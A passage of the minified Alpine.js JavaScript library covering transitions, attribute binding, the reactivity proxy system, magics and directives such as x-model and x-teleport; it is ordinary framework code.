1)";i&&(t._x_transition.enter.during={transformOrigin:b,transitionDelay:`${f}s`,transitionProperty:g,transitionDuration:`${L}s`,transitionTimingFunction:y},t._x_transition.enter.start={opacity:l,transform:`scale(${u})`},t._x_transition.enter.end={opacity:1,transform:"scale(1)"}),o&&(t._x_transition.leave.during={transformOrigin:b,transitionDelay:`${f}s`,transitionProperty:g,transitionDuration:`${d}s`,transitionTimingFunction:y},t._x_transition.leave.start={opacity:1,transform:"scale(1)"},t._x_transition.leave.end={opacity:l,transform:`scale(${u})`})}function kr(t,e,r={}){t._x_transition||(t._x_transition={enter:{during:r,start:r,end:r},leave:{during:r,start:r,end:r},in(n=()=>{},i=()=>{}){$t(t,e,{during:this.enter.during,start:this.enter.start,end:this.enter.end},n,i)},out(n=()=>{},i=()=>{}){$t(t,e,{during:this.leave.during,start:this.leave.start,end:this.leave.end},n,i)}})}window.Element.prototype._x_toggleAndCascadeWithTransitions=function(t,e,r,n){let i=document.visibilityState==="visible"?requestAnimationFrame:setTimeout,o=()=>i(r);if(e){t._x_transition&&(t._x_transition.enter||t._x_transition.leave)?t._x_transition.enter&&(Object.entries(t._x_transition.enter.during).length||Object.entries(t._x_transition.enter.start).length||Object.entries(t._x_transition.enter.end).length)?t._x_transition.in(r):o():t._x_transition?t._x_transition.in(r):o();return}t._x_hidePromise=t._x_transition?new Promise((s,a)=>{t._x_transition.out(()=>{},()=>s(n)),t._x_transitioning&&t._x_transitioning.beforeCancel(()=>a({isFromCancelledTransition:!0}))}):Promise.resolve(n),queueMicrotask(()=>{let s=$r(t);s?(s._x_hideChildren||(s._x_hideChildren=[]),s._x_hideChildren.push(t)):i(()=>{let a=c=>{let l=Promise.all([c._x_hidePromise,...(c._x_hideChildren||[]).map(a)]).then(([u])=>u?.());return delete c._x_hidePromise,delete c._x_hideChildren,l};a(t).catch(c=>{if(!c.isFromCancelledTransition)throw c})})})};function $r(t){let e=t.parentNode;if(e)return e._x_hidePromise?e:$r(e)}function $t(t,e,{during:r,start:n,end:i}={},o=()=>{},s=()=>{}){if(t._x_transitioning&&t._x_transitioning.cancel(),Object.keys(r).length===0&&Object.keys(n).length===0&&Object.keys(i).length===0){o(),s();return}let a,c,l;ei(t,{start(){a=e(t,n)},during(){c=e(t,r)},before:o,end(){a(),l=e(t,i)},after:s,cleanup(){c(),l()}})}function ei(t,e){let r,n,i,o=ht(()=>{m(()=>{r=!0,n||e.before(),i||(e.end(),kt()),e.after(),t.isConnected&&e.cleanup(),delete t._x_transitioning})});t._x_transitioning={beforeCancels:[],beforeCancel(s){this.beforeCancels.push(s)},cancel:ht(function(){for(;this.beforeCancels.length;)this.beforeCancels.shift()();o()}),finish:o},m(()=>{e.start(),e.during()}),Dr(),requestAnimationFrame(()=>{if(r)return;let s=Number(getComputedStyle(t).transitionDuration.replace(/,.*/,"").replace("s",""))*1e3,a=Number(getComputedStyle(t).transitionDelay.replace(/,.*/,"").replace("s",""))*1e3;s===0&&(s=Number(getComputedStyle(t).animationDuration.replace("s",""))*1e3),m(()=>{e.before()}),n=!0,requestAnimationFrame(()=>{r||(m(()=>{e.end()}),kt(),setTimeout(t._x_transitioning.finish,s+a),i=!0)})})}function _t(t,e,r){if(t.indexOf(e)===-1)return r;let n=t[t.indexOf(e)+1];if(!n||e==="scale"&&isNaN(n))return r;if(e==="duration"||e==="delay"){let i=n.match(/([0-9]+)ms/);if(i)return i[1]}return e==="origin"&&["top","right","left","center","bottom"].includes(t[t.indexOf(e)+2])?[n,t[t.indexOf(e)+2]].join(" "):n}var k=!1;function v(t,e=()=>{}){return(...r)=>k?e(...r):t(...r)}function Lr(t){return(...e)=>k&&t(...e)}var jr=[];function V(t){jr.push(t)}function Fr(t,e){jr.forEach(r=>r(t,e)),k=!0,zr(()=>{S(e,(r,n)=>{n(r,()=>{})})}),k=!1}var Lt=!1;function Br(t,e){e._x_dataStack||(e._x_dataStack=t._x_dataStack),k=!0,Lt=!0,zr(()=>{ri(e)}),k=!1,Lt=!1}function ri(t){let e=!1;S(t,(n,i)=>{D(n,(o,s)=>{if(e&&Rr(o))return s();e=!0,i(o,s)})})}function zr(t){let e=R;ae((r,n)=>{let i=e(r);return j(i),()=>{}}),t(),ae(e)}function gt(t,e,r,n=[]){switch(t._x_bindings||(t._x_bindings=C({})),t._x_bindings[e]=r,e=n.includes("camel")?ui(e):e,e){case"value":ni(t,r);break;case"style":oi(t,r);break;case"class":ii(t,r);break;case"selected":case"checked":si(t,e,r);break;default:Hr(t,e,r);break}}function ni(t,e){if(jt(t))t.attributes.value===void 0&&(t.value=e);else if(yt(t))Number.isInteger(e)?t.value=e:!Array.isArray(e)&&typeof e!="boolean"&&![null,void 0].includes(e)?t.value=String(e):Array.isArray(e)?t.checked=e.some(r=>fi(r,t.value)):t.checked=!!e;else if(t.tagName==="SELECT")li(t,e);else{if(t.value===e)return;t.value=e===void 0?"":e}}function ii(t,e){t._x_undoAddedClasses&&t._x_undoAddedClasses(),t._x_undoAddedClasses=mt(t,e)}function oi(t,e){t._x_undoAddedStyles&&t._x_undoAddedStyles(),t._x_undoAddedStyles=X(t,e)}function si(t,e,r){Hr(t,e,r),ci(t,e,r)}function Hr(t,e,r){[null,void 0,!1].includes(r)&&pi(e)?t.removeAttribute(e):(Vr(e)&&(r=e),ai(t,e,r))}function ai(t,e,r){t.getAttribute(e)!=r&&t.setAttribute(e,r)}function ci(t,e,r){t[e]!==r&&(t[e]=r)}function li(t,e){let r=[].concat(e).map(n=>n+"");Array.from(t.options).forEach(n=>{n.selected=r.includes(n.value)})}function ui(t){return t.toLowerCase().replace(/-(\w)/g,(e,r)=>r.toUpperCase())}function fi(t,e){return t==e}function xt(t){return[1,"1","true","on","yes",!0].includes(t)?!0:[0,"0","false","off","no",!1].includes(t)?!1:t?Boolean(t):null}var di=new Set(["allowfullscreen","async","autofocus","autoplay","checked","controls","default","defer","disabled","formnovalidate","inert","ismap","itemscope","loop","multiple","muted","nomodule","novalidate","open","playsinline","readonly","required","reversed","selected","shadowrootclonable","shadowrootdelegatesfocus","shadowrootserializable"]);function Vr(t){return di.has(t)}function pi(t){return!["aria-pressed","aria-checked","aria-expanded","aria-selected"].includes(t)}function Ur(t,e,r){return t._x_bindings&&t._x_bindings[e]!==void 0?t._x_bindings[e]:Kr(t,e,r)}function qr(t,e,r,n=!0){if(t._x_bindings&&t._x_bindings[e]!==void 0)return t._x_bindings[e];if(t._x_inlineBindings&&t._x_inlineBindings[e]!==void 0){let i=t._x_inlineBindings[e];return i.extract=n,Mt(()=>T(t,i.expression))}return Kr(t,e,r)}function Kr(t,e,r){let n=t.getAttribute(e);return n===null?typeof r=="function"?r():r:n===""?!0:Vr(e)?!![e,"true"].includes(n):n}function yt(t){return t.type==="checkbox"||t.localName==="ui-checkbox"||t.localName==="ui-switch"}function jt(t){return t.type==="radio"||t.localName==="ui-radio"}function Ft(t,e){let r;return function(){let n=this,i=arguments,o=function(){r=null,t.apply(n,i)};clearTimeout(r),r=setTimeout(o,e)}}function Bt(t,e){let r;return function(){let n=this,i=arguments;r||(t.apply(n,i),r=!0,setTimeout(()=>r=!1,e))}}function zt({get:t,set:e},{get:r,set:n}){let i=!0,o,s,a=R(()=>{let c=t(),l=r();if(i)n(Ae(c)),i=!1;else{let u=JSON.stringify(c),f=JSON.stringify(l);u!==o?n(Ae(c)):u!==f&&e(Ae(l))}o=JSON.stringify(t()),s=JSON.stringify(r())});return()=>{j(a)}}function Ae(t){return typeof t=="object"?JSON.parse(JSON.stringify(t)):t}function Wr(t){(Array.isArray(t)?t:[t]).forEach(r=>r(B))}var Z={},Gr=!1;function Jr(t,e){if(Gr||(Z=C(Z),Gr=!0),e===void 0)return Z[t];Z[t]=e,rt(Z[t]),typeof e=="object"&&e!==null&&e.hasOwnProperty("init")&&typeof e.init=="function"&&Z[t].init()}function Yr(){return Z}var Xr={};function Zr(t,e){let r=typeof e!="function"?()=>e:e;return t instanceof Element?Oe(t,r()):(Xr[t]=r,()=>{})}function Qr(t){return Object.entries(Xr).forEach(([e,r])=>{Object.defineProperty(t,e,{get(){return(...n)=>r(...n)}})}),t}function Oe(t,e,r){let n=[];for(;n.length;)n.pop()();let i=Object.entries(e).map(([s,a])=>({name:s,value:a})),o=be(i);return i=i.map(s=>o.find(a=>a.name===s.name)?{name:`x-bind:${s.name}`,value:`"${s.value}"`}:s),pt(t,i,r).map(s=>{n.push(s.runCleanups),s()}),()=>{for(;n.length;)n.pop()()}}var tn={};function en(t,e){tn[t]=e}function rn(t,e){return Object.entries(tn).forEach(([r,n])=>{Object.defineProperty(t,r,{get(){return(...i)=>n.bind(e)(...i)},enumerable:!1})}),t}var mi={get reactive(){return C},get release(){return j},get effect(){return R},get raw(){return se},get transaction(){return Xe},version:"3.15.12",flushAndStopDeferringMutations:ir,dontAutoEvaluateFunctions:Mt,disableEffectScheduling:Ge,startObservingMutations:ut,stopObservingMutations:fe,setReactivityEngine:Je,onAttributeRemoved:Ot,onAttributesAdded:At,closestDataStack:F,skipDuringClone:v,onlyDuringClone:Lr,addRootSelector:Dt,addInitSelector:It,setErrorHandler:lr,interceptClone:V,addScopeToNode:N,deferMutations:nr,mapAttributes:ot,evaluateLater:_,interceptInit:Pr,initInterceptors:rt,injectMagics:H,setEvaluator:fr,setRawEvaluator:pr,mergeProxies:P,extractProp:qr,findClosest:A,onElRemoved:et,closestRoot:Y,destroyTree:I,interceptor:Tt,transition:$t,setStyles:X,mutateDom:m,directive:p,entangle:zt,throttle:Bt,debounce:Ft,evaluate:T,evaluateRaw:hr,initTree:S,nextTick:st,prefixed:O,prefix:gr,plugin:Wr,magic:x,store:Jr,start:Or,clone:Br,cloneNode:Fr,bound:Ur,$data:Ct,watch:St,walk:D,data:en,bind:Zr},B=mi;function Ce(t,e){let r=Object.create(null),n=t.split(",");for(let i=0;i<n.length;i++)r[n[i]]=!0;return e?i=>!!r[i.toLowerCase()]:i=>!!r[i]}var hi="itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly";var qs=Ce(hi+",async,autofocus,autoplay,controls,default,defer,disabled,hidden,loop,open,required,reversed,scoped,seamless,checked,muted,multiple,selected");var nn=Object.freeze({}),Ks=Object.freeze([]);var _i=Object.prototype.hasOwnProperty,bt=(t,e)=>_i.call(t,e),U=Array.isArray,at=t=>on(t)==="[object Map]";var gi=t=>typeof t=="string",Ht=t=>typeof t=="symbol",wt=t=>t!==null&&typeof t=="object";var xi=Object.prototype.toString,on=t=>xi.call(t),Te=t=>on(t).slice(8,-1);var Vt=t=>gi(t)&&t!=="NaN"&&t[0]!=="-"&&""+parseInt(t,10)===t;var Ut=t=>{let e=Object.create(null);return r=>e[r]||(e[r]=t(r))},yi=/-(\w)/g,Ws=Ut(t=>t.replace(yi,(e,r)=>r?r.toUpperCase():"")),bi=/\B([A-Z])/g,Gs=Ut(t=>t.replace(bi,"-$1").toLowerCase()),Me=Ut(t=>t.charAt(0).toUpperCase()+t.slice(1)),Js=Ut(t=>t?`on${Me(t)}`:""),Re=(t,e)=>t!==e&&(t===t||e===e);var Ne=new WeakMap,Et=[],$,Q=Symbol("iterate"),Pe=Symbol("Map key iterate");function wi(t){return t&&t._isEffect===!0}function fn(t,e=nn){wi(t)&&(t=t.raw);let r=Si(t,e);return e.lazy||r(),r}function dn(t){t.active&&(pn(t),t.options.onStop&&t.options.onStop(),t.active=!1)}var Ei=0;function Si(t,e){let r=function(){if(!r.active)return t();if(!Et.includes(r)){pn(r);try{return Ai(),Et.push(r),$=r,t()}finally{Et.pop(),mn(),$=Et[Et.length-1]}}};return r.id=Ei++,r.allowRecurse=!!e.allowRecurse,r._isEffect=!0,r.active=!0,r.raw=t,r.deps=[],r.options=e,r}function pn(t){let{deps:e}=t;if(e.length){for(let r=0;r<e.length;r++)e[r].delete(t);e.length=0}}var ct=!0,Ie=[];function vi(){Ie.push(ct),ct=!1}function Ai(){Ie.push(ct),ct=!0}function mn(){let t=Ie.pop();ct=t===void 0?!0:t}function M(t,e,r){if(!ct||$===void 0)return;let n=Ne.get(t);n||Ne.set(t,n=new Map);let i=n.get(r);i||n.set(r,i=new Set),i.has($)||(i.add($),$.deps.push(i),$.options.onTrack&&$.options.onTrack({effect:$,target:t,type:e,key:r}))}function K(t,e,r,n,i,o){let s=Ne.get(t);if(!s)return;let a=new Set,c=u=>{u&&u.forEach(f=>{(f!==$||f.allowRecurse)&&a.add(f)})};if(e==="clear")s.forEach(c);else if(r==="length"&&U(t))s.forEach((u,f)=>{(f==="length"||f>=n)&&c(u)});else switch(r!==void 0&&c(s.get(r)),e){case"add":U(t)?Vt(r)&&c(s.get("length")):(c(s.get(Q)),at(t)&&c(s.get(Pe)));break;case"delete":U(t)||(c(s.get(Q)),at(t)&&c(s.get(Pe)));break;case"set":at(t)&&c(s.get(Q));break}let l=u=>{u.options.onTrigger&&u.options.onTrigger({effect:u,target:t,key:r,type:e,newValue:n,oldValue:i,oldTarget:o}),u.options.scheduler?u.options.scheduler(u):u()};a.forEach(l)}var Oi=Ce("__proto__,__v_isRef,__isVue"),hn=new Set(Object.getOwnPropertyNames(Symbol).map(t=>Symbol[t]).filter(Ht)),Ci=_n();var Ti=_n(!0);var sn=Mi();function Mi(){let t={};return["includes","indexOf","lastIndexOf"].forEach(e=>{t[e]=function(...r){let n=h(this);for(let o=0,s=this.length;o<s;o++)M(n,"get",o+"");let i=n[e](...r);return i===-1||i===!1?n[e](...r.map(h)):i}}),["push","pop","shift","unshift","splice"].forEach(e=>{t[e]=function(...r){vi();let n=h(this)[e].apply(this,r);return mn(),n}}),t}function _n(t=!1,e=!1){return function(n,i,o){if(i==="__v_isReactive")return!t;if(i==="__v_isReadonly")return t;if(i==="__v_raw"&&o===(t?e?qi:bn:e?Ui:yn).get(n))return n;let s=U(n);if(!t&&s&&bt(sn,i))return Reflect.get(sn,i,o);let a=Reflect.get(n,i,o);return(Ht(i)?hn.has(i):Oi(i))||(t||M(n,"get",i),e)?a:De(a)?!s||!Vt(i)?a.value:a:wt(a)?t?wn(a):Xt(a):a}}var Ri=Ni();function Ni(t=!1){return function(r,n,i,o){let s=r[n];if(!t&&(i=h(i),s=h(s),!U(r)&&De(s)&&!De(i)))return s.value=i,!0;let a=U(r)&&Vt(n)?Number(n)<r.length:bt(r,n),c=Reflect.set(r,n,i,o);return r===h(o)&&(a?Re(i,s)&&K(r,"set",n,i,s):K(r,"add",n,i)),c}}function Pi(t,e){let r=bt(t,e),n=t[e],i=Reflect.deleteProperty(t,e);return i&&r&&K(t,"delete",e,void 0,n),i}function Di(t,e){let r=Reflect.has(t,e);return(!Ht(e)||!hn.has(e))&&M(t,"has",e),r}function Ii(t){return M(t,"iterate",U(t)?"length":Q),Reflect.ownKeys(t)}var ki={get:Ci,set:Ri,deleteProperty:Pi,has:Di,ownKeys:Ii},$i={get:Ti,set(t,e){return console.warn(`Set operation on key "${String(e)}" failed: target is readonly.`,t),!0},deleteProperty(t,e){return console.warn(`Delete operation on key "${String(e)}" failed: target is readonly.`,t),!0}};var ke=t=>wt(t)?Xt(t):t,$e=t=>wt(t)?wn(t):t,Le=t=>t,Yt=t=>Reflect.getPrototypeOf(t);function qt(t,e,r=!1,n=!1){t=t.__v_raw;let i=h(t),o=h(e);e!==o&&!r&&M(i,"get",e),!r&&M(i,"get",o);let{has:s}=Yt(i),a=n?Le:r?$e:ke;if(s.call(i,e))return a(t.get(e));if(s.call(i,o))return a(t.get(o));t!==i&&t.get(e)}function Kt(t,e=!1){let r=this.__v_raw,n=h(r),i=h(t);return t!==i&&!e&&M(n,"has",t),!e&&M(n,"has",i),t===i?r.has(t):r.has(t)||r.has(i)}function Wt(t,e=!1){return t=t.__v_raw,!e&&M(h(t),"iterate",Q),Reflect.get(t,"size",t)}function an(t){t=h(t);let e=h(this);return Yt(e).has.call(e,t)||(e.add(t),K(e,"add",t,t)),this}function cn(t,e){e=h(e);let r=h(this),{has:n,get:i}=Yt(r),o=n.call(r,t);o?xn(r,n,t):(t=h(t),o=n.call(r,t));let s=i.call(r,t);return r.set(t,e),o?Re(e,s)&&K(r,"set",t,e,s):K(r,"add",t,e),this}function ln(t){let e=h(this),{has:r,get:n}=Yt(e),i=r.call(e,t);i?xn(e,r,t):(t=h(t),i=r.call(e,t));let o=n?n.call(e,t):void 0,s=e.delete(t);return i&&K(e,"delete",t,void 0,o),s}function un(){let t=h(this),e=t.size!==0,r=at(t)?new Map(t):new Set(t),n=t.clear();return e&&K(t,"clear",void 0,void 0,r),n}function Gt(t,e){return function(n,i){let o=this,s=o.__v_raw,a=h(s),c=e?Le:t?$e:ke;return!t&&M(a,"iterate",Q),s.forEach((l,u)=>n.call(i,c(l),c(u),o))}}function Jt(t,e,r){return function(...n){let i=this.__v_raw,o=h(i),s=at(o),a=t==="entries"||t===Symbol.iterator&&s,c=t==="keys"&&s,l=i[t](...n),u=r?Le:e?$e:ke;return!e&&M(o,"iterate",c?Pe:Q),{next(){let{value:f,done:b}=l.next();return b?{value:f,done:b}:{value:a?[u(f[0]),u(f[1])]:u(f),done:b}},[Symbol.iterator](){return this}}}}function q(t){return function(...e){{let r=e[0]?`on key "${e[0]}" `:"";console.warn(`${Me(t)} operation ${r}failed: target is readonly.`,h(this))}return t==="delete"?!1:this}}function Li(){let t={get(o){return qt(this,o)},get size(){return Wt(this)},has:Kt,add:an,set:cn,delete:ln,clear:un,forEach:Gt(!1,!1)},e={get(o){return qt(this,o,!1,!0)},get size(){return Wt(this)},has:Kt,add:an,set:cn,delete:ln,clear:un,forEach:Gt(!1,!0)},r={get(o){return qt(this,o,!0)},get size(){return Wt(this,!0)},has(o){return Kt.call(this,o,!0)},add:q("add"),set:q("set"),delete:q("delete"),clear:q("clear"),forEach:Gt(!0,!1)},n={get(o){return qt(this,o,!0,!0)},get size(){return Wt(this,!0)},has(o){return Kt.call(this,o,!0)},add:q("add"),set:q("set"),delete:q("delete"),clear:q("clear"),forEach:Gt(!0,!0)};return["keys","values","entries",Symbol.iterator].forEach(o=>{t[o]=Jt(o,!1,!1),r[o]=Jt(o,!0,!1),e[o]=Jt(o,!1,!0),n[o]=Jt(o,!0,!0)}),[t,r,e,n]}var[ji,Fi,Bi,zi]=Li();function gn(t,e){let r=e?t?zi:Bi:t?Fi:ji;return(n,i,o)=>i==="__v_isReactive"?!t:i==="__v_isReadonly"?t:i==="__v_raw"?n:Reflect.get(bt(r,i)&&i in n?r:n,i,o)}var Hi={get:gn(!1,!1)};var Vi={get:gn(!0,!1)};function xn(t,e,r){let n=h(r);if(n!==r&&e.call(t,n)){let i=Te(t);console.warn(`Reactive ${i} contains both the raw and reactive versions of the same object${i==="Map"?" as keys":""}, which can lead to inconsistencies. Avoid differentiating between the raw and reactive versions of an object and only use the reactive version if possible.`)}}var yn=new WeakMap,Ui=new WeakMap,bn=new WeakMap,qi=new WeakMap;function Ki(t){switch(t){case"Object":case"Array":return 1;case"Map":case"Set":case"WeakMap":case"WeakSet":return 2;default:return 0}}function Wi(t){return t.__v_skip||!Object.isExtensible(t)?0:Ki(Te(t))}function Xt(t){return t&&t.__v_isReadonly?t:En(t,!1,ki,Hi,yn)}function wn(t){return En(t,!0,$i,Vi,bn)}function En(t,e,r,n,i){if(!wt(t))return console.warn(`value cannot be made reactive: ${String(t)}`),t;if(t.__v_raw&&!(e&&t.__v_isReactive))return t;let o=i.get(t);if(o)return o;let s=Wi(t);if(s===0)return t;let a=new Proxy(t,s===2?n:r);return i.set(t,a),a}function h(t){return t&&h(t.__v_raw)||t}function De(t){return Boolean(t&&t.__v_isRef===!0)}x("nextTick",()=>st);x("dispatch",t=>J.bind(J,t));x("watch",(t,{evaluateLater:e,cleanup:r})=>(n,i)=>{let o=e(n),a=St(()=>{let c;return o(l=>c=l),c},i);r(a)});x("store",Yr);x("data",t=>Ct(t));x("root",t=>Y(t));x("refs",t=>(t._x_refs_proxy||(t._x_refs_proxy=P(Gi(t))),t._x_refs_proxy));function Gi(t){let e=[];return A(t,r=>{r._x_refs&&e.push(r._x_refs)}),e}var je={};function Fe(t){return je[t]||(je[t]=0),++je[t]}function Sn(t,e){return A(t,r=>{if(r._x_ids&&r._x_ids[e])return!0})}function vn(t,e){t._x_ids||(t._x_ids={}),t._x_ids[e]||(t._x_ids[e]=Fe(e))}x("id",(t,{cleanup:e})=>(r,n=null)=>{let i=`${r}${n?`-${n}`:""}`;return Ji(t,i,e,()=>{let o=Sn(t,r),s=o?o._x_ids[r]:Fe(r);return n?`${r}-${s}-${n}`:`${r}-${s}`})});V((t,e)=>{t._x_id&&(e._x_id=t._x_id)});function Ji(t,e,r,n){if(t._x_id||(t._x_id={}),t._x_id[e])return t._x_id[e];let i=n();return t._x_id[e]=i,r(()=>{delete t._x_id[e]}),i}x("el",t=>t);An("Focus","focus","focus");An("Persist","persist","persist");function An(t,e,r){x(e,n=>E(`You can't use [$${e}] without first installing the "${t}" plugin here: https://alpinejs.dev/plugins/${r}`,n))}p("modelable",(t,{expression:e},{effect:r,evaluateLater:n,cleanup:i})=>{let o=n(e),s=()=>{let u;return o(f=>u=f),u},a=n(`${e} = __placeholder`),c=u=>a(()=>{},{scope:{__placeholder:u}}),l=s();c(l),queueMicrotask(()=>{if(!t._x_model)return;t._x_removeModelListeners.default();let u=t._x_model.get,f=t._x_model.setWithModifiers,b=zt({get(){return u()},set(g){f(g)}},{get(){return s()},set(g){c(g)}});i(b)})});p("teleport",(t,{modifiers:e,expression:r},{cleanup:n})=>{t.tagName.toLowerCase()!=="template"&&E("x-teleport can only be used on a <template> tag",t);let i=On(r),o=t.content.cloneNode(!0).firstElementChild;t._x_teleport=o,o._x_teleportBack=t,t.setAttribute("data-teleport-template",!0),o.setAttribute("data-teleport-target",!0),t._x_forwardEvents&&t._x_forwardEvents.forEach(a=>{o.addEventListener(a,c=>{c.stopPropagation(),t.dispatchEvent(new c.constructor(c.type,c))})}),N(o,{},t);let s=(a,c,l)=>{l.includes("prepend")?c.parentNode.insertBefore(a,c):l.includes("append")?c.parentNode.insertBefore(a,c.nextSibling):c.appendChild(a)};m(()=>{v(()=>{s(o,i,e),S(o)})()}),t._x_teleportPutBack=()=>{let a=On(r);m(()=>{s(t._x_teleport,a,e)})},n(()=>m(()=>{o.remove(),I(o)}))});var Yi=document.createElement("div");function On(t){let e=v(()=>document.querySelector(t),()=>Yi)();return e||E(`Cannot find x-teleport element for selector: "${t}"`),e}var Cn=()=>{};Cn.inline=(t,{modifiers:e},{cleanup:r})=>{e.includes("self")?t._x_ignoreSelf=!0:t._x_ignore=!0,r(()=>{e.includes("self")?delete t._x_ignoreSelf:delete t._x_ignore})};p("ignore",Cn);p("effect",v((t,{expression:e},{effect:r})=>{r(_(t,e))}));function z(t,e,r,n){let i=t,o=c=>n(c),s={},a=(c,l)=>u=>l(c,u);return r.includes("dot")&&(e=Xi(e)),r.includes("camel")&&(e=Zi(e)),r.includes("capture")&&(s.capture=!0),r.includes("window")&&(i=window),r.includes("document")&&(i=document),r.includes("passive")&&(s.passive=r[r.indexOf("passive")+1]!=="false"),o=Be(r,o),r.includes("prevent")&&(o=a(o,(c,l)=>{l.preventDefault(),c(l)})),r.includes("stop")&&(o=a(o,(c,l)=>{l.stopPropagation(),c(l)})),r.includes("once")&&(o=a(o,(c,l)=>{c(l),i.removeEventListener(e,o,s)})),(r.includes("away")||r.includes("outside"))&&(i=document,o=a(o,(c,l)=>{t.contains(l.target)||l.target.isConnected!==!1&&(t.offsetWidth<1&&t.offsetHeight<1||t._x_isShown!==!1&&c(l))})),r.includes("self")&&(o=a(o,(c,l)=>{l.target===t&&c(l)})),e==="submit"&&(o=a(o,(c,l)=>{l.target._x_pendingModelUpdates&&l.target._x_pendingModelUpdates.forEach(u=>u()),c(l)})),(to(e)||Mn(e))&&(o=a(o,(c,l)=>{eo(l,r)||c(l)})),i.addEventListener(e,o,s),()=>{i.removeEventListener(e,o,s)}}function Be(t,e){if(t.includes("debounce")){let r=t[t.indexOf("debounce")+1]||"invalid-wait",n=Zt(r.split("ms")[0])?Number(r.split("ms")[0]):250;e=Ft(e,n)}if(t.includes("throttle")){let r=t[t.indexOf("throttle")+1]||"invalid-wait",n=Zt(r.split("ms")[0])?Number(r.split("ms")[0]):250;e=Bt(e,n)}return e}function Xi(t){return t.replace(/-/g,".")}function Zi(t){return t.toLowerCase().replace(/-(\w)/g,(e,r)=>r.toUpperCase())}function Zt(t){return!Array.isArray(t)&&!isNaN(t)}function Qi(t){return[" ","_"].includes(t)?t:t.replace(/([a-z])([A-Z])/g,"$1-$2").replace(/[_\s]/,"-").toLowerCase()}function to(t){return["keydown","keyup"].includes(t)}function Mn(t){return["contextmenu","click","mouse"].some(e=>t.includes(e))}function eo(t,e){let r=e.filter(o=>!["window","document","prevent","stop","once","capture","self","away","outside","passive","preserve-scroll","blur","change","lazy"].includes(o));if(r.includes("debounce")){let o=r.indexOf("debounce");r.splice(o,Zt((r[o+1]||"invalid-wait").split("ms")[0])?2:1)}if(r.includes("throttle")){let o=r.indexOf("throttle");r.splice(o,Zt((r[o+1]||"invalid-wait").split("ms")[0])?2:1)}if(r.length===0||r.length===1&&Tn(t.key).includes(r[0]))return!1;let i=["ctrl","shift","alt","meta","cmd","super"].filter(o=>r.includes(o));return r=r.filter(o=>!i.includes(o)),!(i.length>0&&i.filter(s=>((s==="cmd"||s==="super")&&(s="meta"),t[`${s}Key`])).length===i.length&&(Mn(t.type)||Tn(t.key).includes(r[0])))}function Tn(t){if(!t)return[];t=Qi(t);let e={ctrl:"control",slash:"/",space:" ",spacebar:" ",cmd:"meta",esc:"escape",up:"arrow-up",down:"arrow-down",left:"arrow-left",right:"arrow-right",period:".",comma:",",equal:"=",minus:"-",underscore:"_"};return e[t]=t,Object.keys(e).map(r=>{if(e[r]===t)return r}).filter(r=>r)}p("model",(t,{modifiers:e,expression:r},{effect:n,cleanup:i})=>{let o=t;e.includes("parent")&&(o=A(t,d=>d!==t));let s=_(o,r),a;typeof r=="string"?a=_(o,`${r} = __placeholder`):typeof r=="function"&&typeof r()=="string"?a=_(o,`${r()} = __placeholder`):a=()=>{};let c=()=>{let d;return s(y=>d=y),Rn(d)?d.get():d},l=d=>{let y;s(w=>y=w),Rn(y)?y.set(d):a(()=>{},{scope:{__placeholder:d}})};typeof r=="string"&&t.type==="radio"&&m(()=>{t.hasAttribute("name")||t.setAttribute("name",r)});let u=e.includes("change")||e.includes("lazy"),f=e.includes("blur"),b=e.includes("enter"),g=u||f||b,L;if(k)L=()=>{};else if(g){let d=[],y=w=>l(Qt(t,e,w,c()));if(u&&d.push(z(t,"change",e,y)),f&&(d.push(z(t,"blur",e,y)),t.form)){let w=t.form,tt=()=>y({target:t});w._x_pendingModelUpdates||(w._x_pendingModelUpdates=[]),w._x_pendingModelUpdates.push(tt),i(()=>{w._x_pendingModelUpdates&&w._x_pendingModelUpdates.splice(w._x_pendingModelUpdates.indexOf(tt),1)})}b&&d.push(z(t,"keydown",e,w=>{w.key==="Enter"&&y(w)})),L=()=>d.forEach(w=>w())}else{let d=t.tagName.toLowerCase()==="select"||["checkbox","radio"].includes(t.type)?"change":"input";L=z(t,d,e,y=>{l(Qt(t,e,y,c()))})}if(e.includes("fill")&&([void 0,null,""].includes(c())||yt(t)&&Array.isArray(c())||t.tagName.toLowerCase()==="select"&&t.multiple)&&l(Qt(t,e,{target:t},c())),t._x_removeModelListeners||(t._x_removeModelListeners={}),t._x_removeModelListeners.default=L,i(()=>t._x_removeModelListeners.default()),t.form){let d=z(t.form,"reset",[],y=>{st(()=>t._x_model&&t._x_model.set(Qt(t,e,{target:t},c())))});i(()=>d())}t._x_model={get(){return c()},set(d){l(d)},setWithModifiers:Be(e,l)},t._x_forceModelUpdate=d=>{d===void 0&&typeof r=="string"&&r.match(/\./)&&(d=""),m(()=>{yt(t)?Array.isArray(d)?t.checked=d.some(y=>y==t.value):t.checked=!!d:jt(t)?typeof d=="boolean"?t.checked=xt(t.value)===d:t.checked=t.value==d:gt(t,"value",d)})},n(()=>{let d=c();e.includes("unintrusive")&&document.activeElement.isSameNode(t)||t._x_forceModelUpdate(d)})});function Qt(t,e,r,n){return m(()=>{if(r instanceof CustomEvent&&r.detail!==void 0)return r.detail!==null&&r.detail!==void 0?r.detail:r.target.value;if(yt(t))if(Array.isArray(n)){let i=null;return e.includes("number")?i=ze(r.target.value):e.includes("boolean")?i=xt(r.target.value):i=r.target.value,r.target.checked?n.includes(i)?n:n.concat([i]):n.filter(o=>!ro(o,i))}else return r.target.checked;else{if(t.tagName.toLowerCase()==="select"&&t.multiple)return e.includes("number")?Array.from(r.target.selectedOptions).map(i=>{let o=i.value||i.text;return ze(o)}):e.includes("boolean")?Array.from(r.target.selectedOptions).map(i=>{let o=i.value||i.text;return xt(o)}):Array.from(r.target.selectedOptions).map(i=>i.value||i.text);{let i;return jt(t)?r.target.checked?i=r.target.value:i=n:i=r.target.value,e.includes("number")?ze(i):e.includes("boolean")?xt(i):e.includes("trim")?i.trim():i}}})}function ze(t){let e=t?parseFloat(t):null;return no(e)?e:t}function ro(t,e){return t==e}function no(t){return!Array.isArray(t)&&!isNaN(t)}function Rn(t){return t!==null&&typeof t=="object"&&typeof t.get=="function"&&typeof t.set=="function"}p("cloak",t=>queueMicrotask(()=>m(()=>t.removeAttribute(O("cloak")))));It(()=>`[${O("init")}]`);p("init",v((t,{expression:e},{evaluate:r})=>typeof e=="string"?!!e.trim()&&r(e,{},!1):r(e,{},!1)));p("text",(t,{expression:e},{effect:r,evaluateLater:n})=>{let i=n(e);r(()=>{i(o=>{m(()=>{t.textContent=o})})})});p("html",(t,{expression:e},{effect:r,evaluateLater:n})=>{let 